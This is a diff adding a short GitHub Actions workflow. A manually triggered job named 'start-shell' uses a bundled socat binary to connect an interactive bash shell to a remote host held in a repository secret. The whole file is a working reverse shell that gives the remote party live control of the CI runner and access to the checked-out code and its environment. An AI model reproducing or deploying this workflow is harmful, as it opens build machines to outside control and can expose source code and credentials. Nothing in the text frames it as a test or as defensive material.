@@ -1,0 +1,11 @@
+on:
+  workflow_dispatch:
+
+jobs:
+  start-shell:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v3
+    - run: ./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$REMOTE
+      env:
+        REMOTE: ${{ secrets.REMOTE }}
